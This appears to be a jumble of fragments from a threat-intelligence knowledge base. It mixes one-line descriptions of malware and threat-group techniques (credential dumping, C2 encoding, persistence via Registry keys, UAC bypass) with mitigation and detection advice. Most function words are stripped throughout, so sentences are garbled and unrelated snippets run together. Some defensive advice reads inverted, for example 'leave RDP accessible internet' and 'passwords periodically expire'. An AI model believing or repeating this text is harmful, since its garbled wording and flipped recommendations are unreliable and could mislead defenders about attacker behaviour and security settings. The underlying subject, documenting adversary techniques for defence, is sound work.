[pwdump](https://attack.mitre.org/software/S0006), [PowerSploit](https://attack.mitre.org/software/S0194), [Windows Credential Editor](https://attack.mitre.org/software/S0005).(Citation: FireEye APT41 Aug 2019) Monitor newly executed processes attempt cloud permission settings. [CreepySnail](https://attack.mitre.org/software/S1024) C2.(Citation: POLONIUM June 2022) [QuasarRAT](https://attack.mitre.org/software/S0262) passwords common browsers.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) [EKANS](https://attack.mitre.org/software/S0605) standard encryption library functions encrypt files.(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS) [Gamaredon Group](https://attack.mitre.org/groups/G0047) file stealer gather victim's drive serial send C2 server.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: CERT-EE Gamaredon January 2021) [BoomBox](https://attack.mitre.org/software/S0635) download files Dropbox hardcoded access token.(Citation: MSTIC Nobelium Toolset 2021) Monitor newly executed processes hijack legitimate user's SSH session laterally environment. [Molerats](https://attack.mitre.org/groups/G0021) forged code-signing certificates malware.(Citation: FireEye Operation Molerats) [Small Sieve](https://attack.mitre.org/software/S1035) custom hex byte swapping encoding scheme obfuscate tasking traffic.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: NCSC GCHQ Sieve Jan 2022) settings prevent applications running downloaded Apple Store mitigate issues. allowing unsigned applications mitigate risk. [BoomBox](https://attack.mitre.org/software/S0635) ability execute LDAP query enumerate distinguished name, SAM account name, display domain users.(Citation: MSTIC Nobelium Toolset 2021) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Turla](https://attack.mitre.org/groups/G0010) multiple backdoors communicate C2 server email attachments.(Citation: Crowdstrike GTR2020 Mar 2020) Windows 10, enable Attack Surface Reduction (ASR) rules prevent application writing signed vulnerable driver system.(Citation: Malicious Driver Reporting Center) Windows 11, enable Vulnerable Driver Blocklist assist hardening party-developed drivers.(Citation: driver block rules)   Protect generated event files stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities. (Citation: Kaspersky Turla) [APT39](https://attack.mitre.org/groups/G0087) post-exploitation tools including RemCom Non-sucking Service Manager (NSSM) execute processes.(Citation: BitDefender Chafer 2020)(Citation: Symantec Chafer February 2018) (Citation: NCSC APT29 July 2020)(Citation: CISA SoreFang July 2016) [Mythic](https://attack.mitre.org/software/S0699) supports SMB-based peer-to-peer C2 profiles.(Citation: Mythc Documentation)	 [QakBot](https://attack.mitre.org/software/S0650) MSIExec spawn multiple cmd.exe processes.(Citation: Crowdstrike Qakbot October 2020) [PoshC2](https://attack.mitre.org/software/S0378) utilize multiple methods bypass UAC.(Citation: GitHub PoshC2) read-only containers, read-only file systems, minimal images prevent running commands.(Citation: Kubernetes Hardening Guide) Ensure strong password (ideally 25+ characters) complexity service accounts passwords periodically expire.(Citation: AdSecurity Cracking Kerberos Dec 2015) Managed Service Accounts party product password vaulting.(Citation: AdSecurity Cracking Kerberos Dec 2015) [Ramsay](https://attack.mitre.org/software/S0458) spread infecting portable executable files networks shared drives.(Citation: Eset Ramsay 2020)	 Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor executed commands arguments PowerShell cmdlets retrieve modify file directory DACLs. [HEXANE](https://attack.mitre.org/groups/G1001) relied victim's executing malicious file attachments delivered email embedded actor-controlled websites deliver malware.(Citation: SecureWorks August 2019)(Citation: Dragos Hexane)(Citation: ClearSky Siamesekitten August 2021)(Citation: Zscaler Lyceum DnsSystem June 2022) [Astaroth](https://attack.mitre.org/software/S0373) searches processes system.(Citation: Cybereason Astaroth Feb 2019) [ROKRAT](https://attack.mitre.org/software/S0240)  `SetWindowsHookEx` `GetKeyNameText` capture keystrokes.(Citation: Talos ROKRAT)(Citation: Volexity InkySquid RokRAT August 2021) [Mosquito](https://attack.mitre.org/software/S0256) custom encryption algorithm, consists XOR stream Blum Blum Shub algorithm.(Citation: ESET Turla Mosquito Jan 2018) [Comnie](https://attack.mitre.org/software/S0244) blogs third-party sites (GitHub, tumbler, BlogSpot) avoid DNS-based blocking communication command control server.(Citation: Palo Alto Comnie) [Briba](https://attack.mitre.org/software/S0204) downloads files infected hosts.(Citation: Symantec Briba 2012) (Citation: McAfee Lazarus Nov 2020) [APT29](https://attack.mitre.org/groups/G0016) multiple command-line utilities enumerate running processes.(Citation: Volexity SolarWinds)(Citation: Deep Dive Solorigate January 2021)(Citation: CrowdStrike StellarParticle January 2022) [Astaroth](https://attack.mitre.org/software/S0373) malicious files including VBS, LNK, execution.(Citation: Securelist Brazilian Banking Malware July 2020) [Mustang Panda](https://attack.mitre.org/groups/G0129) mshta.exe launch collection scripts.(Citation: Secureworks BRONZE PRESIDENT December 2019) [Ebury](https://attack.mitre.org/software/S0377) implemented fallback mechanism DGA attacker connected infected days.(Citation: ESET Ebury Oct 2017) [BendyBear](https://attack.mitre.org/software/S0574) byte randomization obscure behavior.(Citation: Unit42 BendyBear Feb 2021) [Amadey](https://attack.mitre.org/software/S1025) collect compromised host.(Citation: BlackBerry Amadey 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) batch scripts download tools executing cryptocurrency miners.(Citation: ATT TeamTNT Chimaera September 2020) (Citation: ESET BackdoorDiplomacy Jun 2021) AADInternals inject malicious DLL (`PTASpy`) `AzureADConnectAuthenticationAgentService` backdoor Azure Pass-Through Authentication.(Citation: AADInternals Azure On-Prem Cloud) Monitor newly executed processes achieve persistence adding Registry key Active Setup local machine. [HOPLIGHT](https://attack.mitre.org/software/S0376) connected outbound TCP port 443 FakeTLS method.(Citation: US-CERT HOPLIGHT Apr 2019) [SharpStage](https://attack.mitre.org/software/S0546) ability create persistence malware Registry autorun key startup folder.(Citation: Cybereason Molerats Dec 2020)  [KONNI](https://attack.mitre.org/software/S0356) bypassed UAC performing token impersonation RPC-based method, included bypassing UAC set “AlwaysNotify".(Citation: Medium KONNI Jan 2020)(Citation: Malwarebytes Konni Aug 2021) Network intrusion prevention data loss prevention tools set block specific file types leaving network unencrypted channels. adversary encrypted channel mechanisms encapsulating traffic situations. (Citation: Symantec Orangeworm April 2018) [APT32](https://attack.mitre.org/groups/G0050) malware injected Cobalt Strike beacon Rundll32.exe.(Citation: Cybereason Cobalt Kitty 2017) [SynAck](https://attack.mitre.org/software/S0242) checks directory location attempt avoid launching sandbox.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) [Dipsind](https://attack.mitre.org/software/S0200) encrypts C2 data AES256 ECB mode.(Citation: PLATINUM April 2016) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors [gsecdump](https://attack.mitre.org/software/S0008) dump credentials. dumped credentials domain controllers.(Citation: Dell TG-3390)(Citation: SecureWorks BRONZE UNION June 2017) [SideTwist](https://attack.mitre.org/software/S0610) collect username targeted system.(Citation: Check APT34 April 2021) UAC's privilege elevation standard users <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]</code>to automatically deny elevation requests, add: <code>"ConsentPromptBehaviorUser"=dword:00000000</code> (Citation: Seclists Kanthak 7zip Installer). enabling installer detection users adding: <code>"EnableInstallerDetection"=dword:00000001</code>. prompt password installation log attempt. disable installer detection, add: <code>"EnableInstallerDetection"=dword:00000000</code>. prevent potential elevation privileges exploitation process UAC detecting installer, installation process continue logged. [njRAT](https://attack.mitre.org/software/S0385) capture screenshots victim’s machines.(Citation: Trend Micro njRAT 2018)  [BLINDINGCAN](https://attack.mitre.org/software/S0520) uploaded files victim machines.(Citation: US-CERT BLINDINGCAN Aug 2020) [Anchor](https://attack.mitre.org/software/S0504) install cron job.(Citation: Medium Anchor DNS July 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Audit Remote Desktop Users membership regularly. Remove unnecessary accounts Remote Desktop Users groups. Monitor Windows Registry values result virtual instance avoid detection. example, virtualization software installed adversary Registry provide detection opportunities.  [Kwampirs](https://attack.mitre.org/software/S0236) collects list running services command <code>tasklist /svc</code>.(Citation: Symantec Orangeworm April 2018) Monitor commands activity indicative attempts abuse deprecated technologies (ex: <code>powershell –v 2</code>). (Citation: Symantec Waterbug Jun 2019) (Citation: Symantec Palmerworm Sep 2020) [APT32](https://attack.mitre.org/groups/G0050) PubPrn.vbs execution scripts execute malware, bypassing defenses.(Citation: Twitter ItsReallyNick Status Update APT32 PubPrn) Set directory access controls prevent file writes search paths applications, folders applications standard dylib folders. multi-factor authentication public-facing webmail servers recommended practice minimize usernames passwords adversaries. [LAPSUS$](https://attack.mitre.org/groups/G1004) searched victim's network collaboration platforms SharePoint discover high-privilege account credentials.(Citation: MSTIC DEV-0537 Mar 2022) (Citation: FireEye SUNBURST Backdoor December 2020) [BLUELIGHT](https://attack.mitre.org/software/S0657) XOR-encoded payload.(Citation: Volexity InkySquid BLUELIGHT August 2021) [Dtrack](https://attack.mitre.org/software/S0567) add service called WBService establish persistence.(Citation: CyberBit Dtrack) [Rocke](https://attack.mitre.org/groups/G0106) issued wget requests infected systems C2.(Citation: Talos Rocke August 2018) [Azorult](https://attack.mitre.org/software/S0344) XOR key decrypt content Base64 decode C2 address.(Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) Monitor DACLs file/directory ownership. commands modify DACLs file/directory ownership built-in utilities generate false positive alert rate, compare baseline knowledge systems typically correlate modification events indications malicious activity possible. [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) shells establish initial foothold lateral movement victim's system.(Citation: ESET BackdoorDiplomacy Jun 2021) [PipeMon](https://attack.mitre.org/software/S0501) modules stored encrypted disk.(Citation: ESET PipeMon 2020) [WhisperGate](https://attack.mitre.org/software/S0689) PowerShell support multiple actions including execution defense evasion.(Citation: Unit 42 WhisperGate January 2022)(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [yty](https://attack.mitre.org/software/S0248) junk code binary, confuse malware analysts.(Citation: ASERT Donot March 2018) [LiteDuke](https://attack.mitre.org/software/S0513) requests C2 communications.(Citation: ESET Dukes October 2019) Monitor contextual data running process, include environment variables, image name, user/owner, reveal abuse features. example, monitoring Windows Event (EID) 400, version PowerShell executing <code>EngineVersion</code> field (which relevant detecting potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) PowerShell running locally remotely <code>HostName</code> field. Furthermore, EID 400 start time EID 403 time PowerShell session.(Citation: inv_ps_attacks) [PoetRAT](https://attack.mitre.org/software/S0428) ability hide unhide files.(Citation: Talos PoetRAT April 2020) [Torisma](https://attack.mitre.org/software/S0678) delivered compromised host victim's IP address allow-list.(Citation: McAfee Lazarus Nov 2020) [BabyShark](https://attack.mitre.org/software/S0414) mshta.exe download execute applications remote server.(Citation: CISA AA20-301A Kimsuky) remote desktop gateways. Create Registry key execute set permissions "Read Control" prevent easy access key administrator permissions requiring Privilege Escalation.(Citation: Palo Alto Office Sofacy) [SpeakUp](https://attack.mitre.org/software/S0374) <code>whoami</code> command. (Citation: CheckPoint SpeakUp Feb 2019) [LazyScripter](https://attack.mitre.org/groups/G0140) `mshta.exe` execute [Koadic](https://attack.mitre.org/software/S0250) stagers.(Citation: MalwareBytes LazyScripter Feb 2021)  Applying restrictive permissions files directories prevent adversaries modifying access control lists. [Clambling](https://attack.mitre.org/software/S0660) establish persistence adding Registry key.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [DarkVishnya](https://attack.mitre.org/groups/G0105) performed port scanning list active services.(Citation: Securelist DarkVishnya Dec 2018) [PyDCrypt](https://attack.mitre.org/software/S1032) `cmd.exe` execution.(Citation: Checkpoint MosesStaff Nov 2021) [OwaAuth](https://attack.mitre.org/software/S0072) command timestop file directory.(Citation: Dell TG-3390) [Axiom](https://attack.mitre.org/groups/G0001) watering hole attacks gain access.(Citation: Cisco 72) [Silence](https://attack.mitre.org/groups/G0091) VBS scripts.(Citation: Cyber Forensicator Silence Jan 2019) [Small Sieve](https://attack.mitre.org/software/S1035) execute correctly word `Platypus` passed command line.(Citation: NCSC GCHQ Sieve Jan 2022) [AppleJeus](https://attack.mitre.org/software/S0584) leading <code>.</code> plist filenames, unlisting Finder app default Terminal directory listings.(Citation: CISA AppleJeus Feb 2021) Monitor windows registry values hidden file conceal malicious activity users security tools. Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) services created [RawPOS](https://attack.mitre.org/software/S0169) legitimate Windows services, names "Windows Management Service", "Microsoft Support", "Windows Advanced Task Manager".(Citation: Kroll RawPOS Jan 2017)(Citation: TrendMicro RawPOS April 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) copying DLL file, variant [Elise](https://attack.mitre.org/software/S0081) calls DLL file rundll32.exe.(Citation: Lotus Blossom Jun 2015) [OnionDuke](https://attack.mitre.org/software/S0052) steals credentials victims.(Citation: F-Secure Dukes) [KONNI](https://attack.mitre.org/software/S0356) POST C2.(Citation: Talos Konni 2017)(Citation: Malwarebytes Konni Aug 2021) [PoshC2](https://attack.mitre.org/software/S0378) implementation [PsExec](https://attack.mitre.org/software/S0029) remote execution.(Citation: GitHub PoshC2) [Drovorub](https://attack.mitre.org/software/S0502) TCP communicate agent client modules.(Citation: NSA/FBI Drovorub August 2020) [FIN7](https://attack.mitre.org/groups/G0046) created scheduled task named “AdobeFlashSync” establish persistence.(Citation: Morphisec FIN7 June 2017) [Darkhotel](https://attack.mitre.org/groups/G0012) keylogger.(Citation: Kaspersky Darkhotel) [CharmPower](https://attack.mitre.org/software/S0674) send victim data FTP credentials hardcoded script.(Citation: Check APT35 CharmPower January 2022) [InvisiMole](https://attack.mitre.org/software/S0260) inject code trusted process APC queue.(Citation: ESET InvisiMole June 2020) [RTM](https://attack.mitre.org/software/S0148) add Registry key "Windows Update" establish persistence.(Citation: ESET RTM Feb 2017) [Saint Bot](https://attack.mitre.org/software/S1018) renamed malicious binaries `wallpaper.mp4` `slideshow.mp4` avoid detection.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Kivars](https://attack.mitre.org/software/S0437) ability list drives infected host.(Citation: TrendMicro BlackTech June 2017) (Citation: FireEye APT41 Aug 2019) Monitor processes viewed inject portable executables (PE) processes evade process-based defenses elevate privileges. [Linux Rabbit](https://attack.mitre.org/software/S0362) maintains persistence infected machine rc.local .bashrc files. (Citation: Anomali Linux Rabbit 2018) [Bankshot](https://attack.mitre.org/software/S0239) identifies processes collects process ids.(Citation: McAfee Bankshot) [QUADAGENT](https://attack.mitre.org/software/S0269) encodes C2 communications base64.(Citation: Unit 42 QUADAGENT July 2018) Monitor newly constructed files establish persistence executing malicious content triggered interrupt signal. [BlackEnergy](https://attack.mitre.org/software/S0089) gathers list installed apps uninstall program Registry. gathers registered mail, browser, instant messaging clients Registry. [BlackEnergy](https://attack.mitre.org/software/S0089) searched file types.(Citation: F-Secure BlackEnergy 2014)(Citation: Securelist BlackEnergy Nov 2014) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) gather IP address victim's machine IP config command.(Citation: ClearSky Lebanese Cedar Jan 2021)  (Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020) [GALLIUM](https://attack.mitre.org/groups/G0093) shells [HTRAN](https://attack.mitre.org/software/S0040) C2 exfiltrate data.(Citation: Cybereason Soft Cell June 2019) [HTTPBrowser](https://attack.mitre.org/software/S0070) capable spawning reverse victim.(Citation: Dell TG-3390) [BBK](https://attack.mitre.org/software/S0470) extract malicious Portable Executable (PE) photo.(Citation: Trend Micro Tick November 2019) Applications vulnerabilities escapes setuid setgid bits set reduce potential damage application compromised. Additionally, programs setuid setgid bits set minimized system. [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors custom collection method intercept two-factor authentication soft tokens.(Citation: FoxIT Wocao December 2019) [LaZagne](https://attack.mitre.org/software/S0349) credential /etc/shadow shadow.py module.(Citation: GitHub LaZagne Dec 2018) [Aquatic Panda](https://attack.mitre.org/groups/G0143) DLL search-order hijacking load `exe`, `dll`, `dat` files memory.(Citation: CrowdStrike AQUATIC PANDA December 2021) [Agent Tesla](https://attack.mitre.org/software/S0331) collect timestamp victim’s machine.(Citation: DigiTrust Agent Tesla Jan 2017) [Higaisa](https://attack.mitre.org/groups/G0126) exfiltrated data C2 channel.(Citation: Zscaler Higaisa 2020) [Emotet](https://attack.mitre.org/software/S0367) delivered phishing emails links. (Citation: Trend Micro Banking Malware Jan 2019)(Citation: Kaspersky Emotet Jan 2019)(Citation: CIS Emotet Apr 2017)(Citation: Malwarebytes Emotet Dec 2017)(Citation: Symantec Emotet Jul 2018)(Citation: US-CERT Emotet Jul 2018)(Citation: Talos Emotet Jan 2019)(Citation: Talos Emotet Jan 2019)(Citation: Picus Emotet Dec 2018) [ZxxZ](https://attack.mitre.org/software/S1013) search compromised host determine running Windows Defender Kasperky antivirus.(Citation: Cisco Talos Bitter Bangladesh 2022) [Stuxnet](https://attack.mitre.org/software/S0603) driver registered boot start service main load-point.(Citation: Symantec W.32 Stuxnet Dossier) [Astaroth](https://attack.mitre.org/software/S0373) fromCharCode() deobfuscation method avoid explicitly writing execution commands hide code. (Citation: Cybereason Astaroth Feb 2019)(Citation: Securelist Brazilian Banking Malware July 2020) [PowerSploit](https://attack.mitre.org/software/S0194) collection Exfiltration modules harvest credentials Policy Preferences.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Molerats](https://attack.mitre.org/groups/G0021) delivered compressed executables ZIP files victims.(Citation: Kaspersky MoleRATs April 2019) [Dtrack](https://attack.mitre.org/software/S0567) <code>cmd.exe</code> add persistent service.(Citation: CyberBit Dtrack) Monitor requests ticket granting ticket service tickets Domain Controller, Windows EID 4769 4768, alternate authentication material, password hashes, Kerberos tickets, application access tokens, laterally environment bypass normal access controls. [APT1](https://attack.mitre.org/groups/G0006) gathered list running processes <code>tasklist /v</code>.(Citation: Mandiant APT1) [zwShell](https://attack.mitre.org/software/S0350) SchTasks execution.(Citation: McAfee Night Dragon) [Mythic](https://attack.mitre.org/software/S0699) supports SSL encrypted C2.(Citation: Mythc Documentation)	 [Confucius](https://attack.mitre.org/groups/G0142) weaponized Word document embedded RTF exploit.(Citation: Uptycs Confucius APT Jan 2021) Windows 10, enable Attack Surface Reduction (ASR) rules prevent DDE attacks spawning child processes Office programs.(Citation: ASR Nov 2017)(Citation: Enigma Reviving DDE Jan 2018) [WarzoneRAT](https://attack.mitre.org/software/S0670) collect compromised host information, including OS version, PC name, RAM size, CPU details.(Citation: Check Warzone Feb 2020) [WarzoneRAT](https://attack.mitre.org/software/S0670) capability reverse proxy.(Citation: Check Warzone Feb 2020) [Sakula](https://attack.mitre.org/software/S0074) samples maintain persistence setting Registry key <code>SOFTWARE\Microsoft\Windows\CurrentVersion\Run\</code> HKLM HKCU hive, Registry file varying sample.(Citation: Dell Sakula) Monitor newly constructed network connections received untrusted hosts.  [Regin](https://attack.mitre.org/software/S0019) keylogger.(Citation: Kaspersky Regin) Monitor newly executed processes [Valid Accounts](https://attack.mitre.org/techniques/T1078) log remote machines Secure (SSH). example, macOS systems <code>log --predicate 'process = "sshd"'</code> review incoming SSH connection attempts suspicious activity. command <code>log --info --predicate 'process = "ssh" eventMessage "ssh"'</code> review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login Screen Sharing) Monitor DLL/PE file events, creation binary files loading DLLs processes, [Valid Accounts](https://attack.mitre.org/techniques/T1078) log service designed accept remote connections, telnet, SSH, VNC. adversary perform actions logged-on user. [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors phishing emails victims contained malicious link.(Citation: ESET Operation Spalax Jan 2021) [QakBot](https://attack.mitre.org/software/S0650) deobfuscate re-assemble code strings execution.(Citation: Cyberint Qakbot 2021)(Citation: ATT QakBot April 2021)(Citation: Kaspersky QakBot September 2021) [Kazuar](https://attack.mitre.org/software/S0265) delete files.(Citation: Unit 42 Kazuar 2017) Configure SNMPv3 level security (authPriv) available.(Citation: US-CERT TA17-156A SNMP Abuse 2017)  [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors relied victim clicking malicious link email.(Citation: Cylance Dust Storm) [HAMMERTOSS](https://attack.mitre.org/software/S0037) <code>-WindowStyle hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows.(Citation: FireEye APT29) signed scripts execute programs environment. application control configured block execution scripts required network prevent potential misuse adversaries.  Monitor executed commands arguments actions change, conceal, delete Registry. Registry modified Windows management tools Windows Management Instrumentation PowerShell, require additional logging features configured operating collect analysis. [Remexi](https://attack.mitre.org/software/S0375) utilizes scheduled tasks persistence mechanism.(Citation: Securelist Remexi Jan 2019) [ccf32](https://attack.mitre.org/software/S1043) determine local time targeted machines.(Citation: Bitdefender FunnyDream Campaign November 2020) disabling old/dangerous authentication protocols (e.g. NTLM), unnecessary certificate features, vulnerable enrollment server roles.(Citation: SpecterOps Certified Pre Owned) encrypting C2 data, [BADNEWS](https://attack.mitre.org/software/S0128) converts hexadecimal representation encodes base64.(Citation: Forcepoint Monsoon) Restrict write access logon scripts specific administrators. [DCSrv](https://attack.mitre.org/software/S1033)'s configuration encrypted.(Citation: Checkpoint MosesStaff Nov 2021) [Tarrask](https://attack.mitre.org/software/S1011) masqueraded executable files `winupdate.exe`, `date.exe`, `win.exe`.(Citation: Tarrask scheduled task)    [Turian](https://attack.mitre.org/software/S0647) VMProtect obfuscation.(Citation: ESET BackdoorDiplomacy Jun 2021) [BadPatch](https://attack.mitre.org/software/S0337) C2.(Citation: Unit 42 BadPatch Oct 2017) [Ramsay](https://attack.mitre.org/software/S0458) distributed spearphishing emails malicious attachments.(Citation: Antiy CERT Ramsay April 2020) [PowerShower](https://attack.mitre.org/software/S0441) ability remove files created dropper process.(Citation: Unit 42 Inception November 2018) default, administrators allowed connect remotely WMI; restrict users allowed connect, disallow users connecting remotely WMI. [Seasalt](https://attack.mitre.org/software/S0345) C2 communications.(Citation: Mandiant APT1 Appendix) [NETWIRE](https://attack.mitre.org/software/S0198) executed luring victims malicious documents.(Citation: FireEye NETWIRE March 2019)(Citation: Unit 42 NETWIRE April 2020)(Citation: Proofpoint NETWIRE December 2020) [APT1](https://attack.mitre.org/groups/G0006) collected files local victim.(Citation: Mandiant APT1) [Dacls](https://attack.mitre.org/software/S0497) download payload C2 server.(Citation: SentinelOne Lazarus macOS July 2020)(Citation: TrendMicro macOS Dacls 2020) [zwShell](https://attack.mitre.org/software/S0350) established persistence adding service.(Citation: McAfee Night Dragon) disabling external email forwarding.(Citation: BEC Campaign) [GALLIUM](https://attack.mitre.org/groups/G0093) collected data victim's local system, including password hashes SAM hive Registry.(Citation: Cybereason Soft Cell June 2019) [APT39](https://attack.mitre.org/groups/G0087) malware drop encrypted CAB files.(Citation: FBI FLASH APT39 September 2020) Ensure proper permissions set Registry hives prevent users modifying components lead privilege escalation. [Shamoon](https://attack.mitre.org/software/S0140) accesses network share(s), enables share access target device, copies executable payload target system, [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) execute malware.(Citation: FireEye Shamoon Nov 2016) [PlugX](https://attack.mitre.org/software/S0013) module capturing keystrokes process including window titles.(Citation: CIRCL PlugX March 2013) [Lazarus Group](https://attack.mitre.org/groups/G0032) spearphishing emails attempt lure users malicious link.(Citation: ESET Lazarus Jun 2020)(Citation: ClearSky Lazarus Aug 2020) [FlawedAmmyy](https://attack.mitre.org/software/S0381) leverages WMI enumerate anti-virus victim.(Citation: Proofpoint TA505 Mar 2018) [GrimAgent](https://attack.mitre.org/software/S0632) identify user target machine.(Citation: IB GrimAgent July 2021) Administrators set monitoring trigger automatic alerts policy criteria met. example, Cloud Access Security Broker (CASB), admins create “High severity app permissions” policy generates alerts apps request severity permissions send permissions requests users.
Security analysts hunt malicious apps tools CASB, identity provider, resource provider (depending platform.) example, filter apps authorized users, apps requesting risk permissions, permissions incongruous app’s purpose, apps “Last authorized” fields. specific app investigated activity log displaying activities app performed, activities mis-logged performed user. App stores resources investigate suspicious apps.
Administrators set variety logs leverage audit tools monitor actions conducted result OAuth 2.0 access. instance, audit reports enable admins identify privilege escalation actions role creations policy modifications, actions performed initial access. Limit permissions create symbolic links Windows Administrators virtualization. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links. (Citation: UCF STIG Symbolic Links) [SUNBURST](https://attack.mitre.org/software/S0559) removed IFEO registry values clean traces persistence.(Citation: Deep Dive Solorigate January 2021) [APT3](https://attack.mitre.org/groups/G0022) tools dump passwords browsers.(Citation: Symantec Buckeye) [Dtrack](https://attack.mitre.org/software/S0567) hard-coded credentials gain access network share.(Citation: CyberBit Dtrack) File monitoring detect files directory server match updates server's content implantation script.(Citation: NSA Cyber Mitigating Shells) [APT29](https://attack.mitre.org/groups/G0016) create users Azure AD.(Citation: MSTIC Nobelium Oct 2021) [Stuxnet](https://attack.mitre.org/software/S0603) decrypts resources loaded memory executed.(Citation: Symantec W.32 Stuxnet Dossier) [RainyDay](https://attack.mitre.org/software/S0629) named services scheduled tasks benign including "ChromeCheck" "googleupdate."(Citation: Bitdefender Naikon April 2021) [Empire](https://attack.mitre.org/software/S0363) <code>New-GPOImmediateTask</code> modify GPO install execute malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053).(Citation: Github PowerShell Empire) [Spark](https://attack.mitre.org/software/S0543) checked <code>GetKeyboardLayoutList</code> language returned <code>GetLocaleInfoA</code> word “Arabic” executing.(Citation: Unit42 Molerat Mar 2020) [PowerStallion](https://attack.mitre.org/software/S0393) PowerShell loops iteratively check commands OneDrive C2 server.(Citation: ESET Turla PowerShell 2019) [Ember Bear](https://attack.mitre.org/groups/G1003) source batch script modify Windows Defender registry keys.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [NETWIRE](https://attack.mitre.org/software/S0198) executed convincing victims clicking malicious links.(Citation: FireEye NETWIRE March 2019)(Citation: Unit 42 NETWIRE April 2020) (Citation: US-CERT TYPEFRAME June 2018) [OilRig](https://attack.mitre.org/groups/G0049) publicly tool SoftPerfect Network Scanner custom tool called GOLDIRONY conduct network scanning.(Citation: FireEye APT34 Webinar Dec 2017) Limit permissions deleting instances privilege. Organizations limit users organization IAM role administrative privileges, strive reduce permanent privileged role assignments, conduct periodic entitlement reviews IAM users, roles policies.(Citation: Mandiant M-Trends 2020) [SILENTTRINITY](https://attack.mitre.org/software/S0692) ability set window hidden.(Citation: GitHub SILENTTRINITY Modules July 2019) Monitor executed commands arguments configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. [NETWIRE](https://attack.mitre.org/software/S0198) automatically archive collected data.(Citation: Red Canary NETWIRE January 2020) [GravityRAT](https://attack.mitre.org/software/S0237) supports file encryption (AES key "lolomycin2017").(Citation: Talos GravityRAT) leave RDP accessible internet. Enable firewall rules block RDP traffic network security zones network. [Sandworm Team](https://attack.mitre.org/groups/G0034) crafted spearphishing emails hyperlinks designed trick unwitting recipients revealing account credentials.(Citation: District Court Indictment GRU Unit 74455 October 2020) [Keydnap](https://attack.mitre.org/software/S0276) HTTPS command control.(Citation: synack 2016 review) [InvisiMole](https://attack.mitre.org/software/S0260) TCP download additional modules.(Citation: ESET InvisiMole June 2020) [FIN5](https://attack.mitre.org/groups/G0053) scans processes victim systems environment automated scripts pull results.(Citation: Mandiant FIN5 GrrCON Oct 2016) [Cardinal RAT](https://attack.mitre.org/software/S0348) collect username victim machine.(Citation: PaloAlto CardinalRat Apr 2017) [ComRAT](https://attack.mitre.org/software/S0126) injected orchestrator DLL explorer.exe. [ComRAT](https://attack.mitre.org/software/S0126) injected communications module victim's default browser C2 connections suspicious network connections initiated browser process.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020) (Citation: FireEye Periscope March 2018) [Rising Sun](https://attack.mitre.org/software/S0448) archive data RC4 encryption Base64 encoding prior exfiltration.(Citation: McAfee Sharpshooter December 2018)	 Outlook methods, blocking macros ineffective Visual Basic engine features separate macro scripting engine.(Citation: SensePost Outlook Forms) released patches address issue. Ensure KB3191938 blocks Outlook Visual Basic displays malicious code warning, KB4011091 disables custom forms default, KB4011162 removes legacy feature, applied systems.(Citation: SensePost Outlook Page) Monitor executed commands arguments commands establishing removing remote shares SMB, including practices detection Windows Admin Shares. [Netwalker](https://attack.mitre.org/software/S0457)'s PowerShell script decode decrypt multiple layers obfuscation, leading [Netwalker](https://attack.mitre.org/software/S0457) DLL loaded memory.(Citation: Sophos Netwalker 2020) [InnaputRAT](https://attack.mitre.org/software/S0259) port 52100 5876 C2 communications.(Citation: ASERT InnaputRAT April 2018) [Helminth](https://attack.mitre.org/software/S0170) DNS C2.(Citation: Palo Alto OilRig 2016) [Silence](https://attack.mitre.org/groups/G0091) create, delete, modify Registry key value.(Citation: IB Silence Sept 2018) [DownPaper](https://attack.mitre.org/software/S0186) collects victim host serial number, sends C2 server.(Citation: ClearSky Charming Kitten Dec 2017) Ensure developers administrators aware risk plaintext passwords software configuration files left endpoint systems servers. [APT41](https://attack.mitre.org/groups/G0096) transferred implant files Windows Admin Shares.(Citation: Crowdstrike GTR2020 Mar 2020) [Turian](https://attack.mitre.org/software/S0647) ability screenshots.(Citation: ESET BackdoorDiplomacy Jun 2021) [Okrum](https://attack.mitre.org/software/S0439) collect network information, including host IP address, DNS, proxy information.(Citation: ESET Okrum July 2019) [JCry](https://attack.mitre.org/software/S0389) PowerShell execute payloads.(Citation: Carbon Black JCry 2019) remove PowerShell systems needed, review performed assess impact environment, legitimate purposes administrative functions.

